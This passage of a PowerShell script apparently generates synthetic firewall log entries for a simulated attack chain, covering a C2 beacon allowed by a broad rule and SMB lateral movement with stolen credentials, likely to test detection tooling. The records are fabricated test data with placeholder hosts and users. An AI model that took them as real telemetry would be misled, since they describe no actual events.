            Category        = "Firewall"
            RuleName        = "Allow_Corp_Internet"   # overly broad rule — C2 slipped through
            RuleNum         = 7
            Action          = "Accept"                # ← should have been Drop
            Severity        = "Critical"
            SeverityNum     = 10
            DeviceName      = "DMZ-GW-02"
            DeviceIP        = "172.16.1.2"
            DeviceOS        = "FwVendor2 R80.40"
            DeviceSite      = "DMZ"
            UserId          = $victimUser.Id
            UserName        = $victimUser.Name
            UserDept        = $victimUser.Dept
            UserPriv        = $victimUser.Priv
            SourceIP        = $victimHost.IP
            DestIP          = $c2IP
            Protocol        = "TCP"
            SourcePort      = 54231
            DestPort        = $c2Port
            PacketsIn       = 12
            PacketsOut      = 9
            BytesIn         = 4096
            BytesOut        = 1380
            PolicyName      = "Standard_1"
            LogType         = "Log"
            SessionId       = "A1B2C3D4"
            Note            = "C2 beacon over HTTPS — indistinguishable from legit traffic without TLS inspection"
            CaseId          = $caseId
        } | ConvertTo-Json -Compress
        SourceVendor  = "FwVendor2"
        FileName      = "FwVendor2-fw-chain-$(($baseTs).ToString('yyyyMMdd')).log"
    }

    # ────────────────────────────────────────────────────────────────────────
    # T+5  FwVendor2 — lateral movement SMB WIN-PROD-01 → WIN-PROD-02
    # ────────────────────────────────────────────────────────────────────────
    $all["FwVendor2"] += @{
        TimeGenerated = ChainTs 5
        RawData = @{
            EventId         = "CP-CHAIN-02"
            CorrelationId   = $correlationId
            AttackChain     = $true
            ChainStep       = "6/10 — SMB lateral movement to WIN-PROD-02 using stolen credentials"
            Vendor          = "FwVendor2"
            Product         = "VPN-1 & FireWall-1"
            Blade           = "Intrusion Prevention"
            Category        = "IPS"
            RuleName        = "Alert_Sensitive_Servers"
            RuleNum         = 42
            Action          = "Accept"               # IPS in detect-only mode
            Severity        = "Critical"
            SeverityNum     = 10
            DeviceName      = "DMZ-GW-02"
            DeviceIP        = "172.16.1.2"
            DeviceOS        = "FwVendor2 R80.40"
            DeviceSite      = "DMZ"
            UserId          = $victimUser.Id
